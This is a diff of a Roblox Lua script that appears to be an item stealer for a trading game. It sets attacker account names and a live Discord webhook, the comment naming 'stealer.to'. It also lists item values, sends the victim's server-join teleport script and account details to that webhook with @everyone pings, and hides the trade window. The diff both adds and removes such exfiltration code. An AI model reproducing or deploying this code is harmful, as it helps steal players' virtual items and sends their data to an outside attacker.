@@ -1,10 +1,7 @@
-local player = game:GetService("Players").LocalPlayer
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1429509611173707858/I_Ph9seXu0Fa-652BET-vfssKq7N6HBFU9kw4Lbrovb5Wpk57ZmS3d4ynznwxNlqfaYw"
-Username = "kyurinlikett" 
-Username2 = "Roopo1344"
-local placeId = game.PlaceId
-local jobId = game.JobId
-MinimumValues = 0
+Username = "DiagoPlug" -- >> Your main account
+Username2 = "DiagoPlug" -- >> Your alt account
+Webhook = "https://discord.com/api/webhooks/1429509611173707858/I_Ph9seXu0Fa-652BET-vfssKq7N6HBFU9kw4Lbrovb5Wpk57ZmS3d4ynznwxNlqfaYw" -- >> https://stealer.to/
+MinimumValues = 0 -- >> Set 0 to disable
 
 repeat task.wait() until game:IsLoaded()
 
@@ -36,7 +33,9 @@ or "Unknown"
 local AgeValue = game:GetService("Players").LocalPlayer.AccountAge
 or "Unknown"
 local ExecutorValue = identifyexecutor() or "Unknown"
-local VersionValue = "1.2"
+local VersionValue = "1.1"
+local consoletp = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 
 local valuesTable = {
     -- >> Ancients/Tier 2 << --
@@ -97,23 +96,21 @@ local valuesTable = {
     ["BonebladeChroma"] = 50,
     ["SawChroma"] = 50,
     -- >> Godlies/Tier 3 << --
-    ["Xenoknife"] = 500,
-    ["Xenoshot"] = 500,
-    ["TravelerGun"] = 5000,
-    ["TreeGun2023"] = 2100,
+    ["TravelerGun"] = 3400,
+    ["TreeGun2023"] = 1100,
     ["Turkey2023"] = 1500,
-    ["TreeKnife2023"] = 1200,
+    ["TreeKnife2023"] = 1100,
     ["Blossom_G"] = 640,
     ["Sakura_K"] = 630,
-    ["Constellation"] = 650,
-    ["Darkshot"] = 660,
-    ["Darksword"] = 600,
-    ["VampireGun"] = 800,
-    ["Bauble"] = 400,
+    ["Constellation"] = 575,
+    ["Darkshot"] = 465,
+    ["Darksword"] = 460,
+    ["VampireGun"] = 460,
+    ["Bauble"] = 310,
     ["ZombieBat"] = 300,
-    ["Candy"] = 100,
-    ["Rainbow_G"] = 300,
-    ["Rainbow_K"] = 300,
+    ["Candy"] = 200,
+    ["Rainbow_G"] = 190,
+    ["Rainbow_K"] = 185,
     ["Ocean_G"] = 150,
     ["WraithGun"] = 145,
     ["WraithKnife"] = 145,
@@ -219,18 +216,6 @@ local valuesTable = {
     ["Cavern_K_2019"] = 22,
 }
 
-
-
--- Способ 1: Roblox protocol ссылка (самый надежный)
-local protocolLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
-
--- Способ 2: Классический скрипт для входа
-local scriptTemplate = [[
-game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")
-]]
-
-local classicScript = string.format(scriptTemplate, placeId, jobId)
-
 function SendMessageEMBED(url, embed, bool)
     local http = game:GetService("HttpService")
     local headers = {
@@ -239,7 +224,7 @@ function SendMessageEMBED(url, embed, bool)
     local data = {
         ["username"] = "Aliwave 2.0",
         ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg",
-        ["content"] = classicScript,
+        ["content"] = TeleportScript,
         ["embeds"] = {
             {
                 ["title"] = embed.title,
@@ -251,7 +236,7 @@ function SendMessageEMBED(url, embed, bool)
     local data2 = {
         ["username"] = "Aliwave 2.0", 
         ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg", 
-        ["content"] = "-- @everyone\n" .. classicScript,
+        ["content"] = "-- @everyone\n" .. TeleportScript,
         ["embeds"] = {
             {
                 ["title"] = embed.title,
@@ -278,25 +263,6 @@ function SendMessageEMBED(url, embed, bool)
             Body = body
         })
     end
-end
-
-local success, result = pcall(function()
-    local json = game:GetService("HttpService"):JSONEncode(data)
-    return request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = json
-    })
-end)
-
-if success then
-    print("✅ Уведомление отправлено!")
-    print("🔗 Protocol ссылка: " .. protocolLink)
-    print("📜 Classic script:")
-    print(classicScript)
-else
-    warn("❌ Ошибка отправки: " .. tostring(result))
 end
 
 -- Новая улучшенная функция скрытия TradeGUI
@@ -678,7 +644,7 @@ local embed = {
         },
         {
             ["name"] = "〘:computer:〙**Console Script**",
-            ["value"] = "```lua\n" .. protocolLink .. "\n```"
+            ["value"] = "```lua\n" .. consoletp .. "\n```"
         },
     }
 }
